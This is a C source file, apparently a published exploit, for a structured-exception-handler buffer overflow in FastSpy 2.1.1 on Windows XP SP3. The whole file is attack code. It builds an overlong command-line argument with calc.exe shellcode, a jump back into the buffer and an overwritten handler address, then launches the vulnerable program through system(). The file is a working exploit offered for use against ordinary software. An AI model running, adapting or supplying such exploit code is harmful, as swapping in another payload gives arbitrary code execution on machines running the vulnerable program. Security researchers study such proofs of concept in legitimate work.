#include <stdio.h>
#include <stdlib.h>


// Exploit Title: FastSpy v2.1.1 Buffer Overflow
// Date: 10/03/12
// Exploit Author: drone
// Software Link: https://sourceforge.net/projects/fastspy/
// Version: 2.1.1
// Tested on: Windows XP SP3

//
// compiled with MS x86 C/C++ compiler v16.00.
// Run in the folder with 'fs.exe' 
//
int main (int argc, char **argv)
{
	char command[2000];
	char *buf = (char *)malloc(1141);
	char *nseh = "\xeb\xd9\x90\x90";
	char *seh = "\x65\x10\x40\x00";
	char *njmp = "\xe9\xa4\xfb\xff\xff";
	// calc.exe
	char shellcode[] = "\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xD0";

	int i;
	for ( i = 0; i < 1120; ++i ) {
		buf[i] = 0x41;
	}

	memcpy ( buf+20, shellcode, strlen(shellcode));
	memcpy ( buf+1115, njmp, 5);
	memcpy ( buf+1120, nseh, sizeof(nseh));
	memcpy ( buf+1120+sizeof(nseh), seh, sizeof(seh));
	
	sprintf(command, "\"\"fs.exe\" -i %s\"\"", buf);

	printf("[+] Launching FastSpy...\n");
	
	system(command);

	printf("[+] Exploit done");
	return 0;
}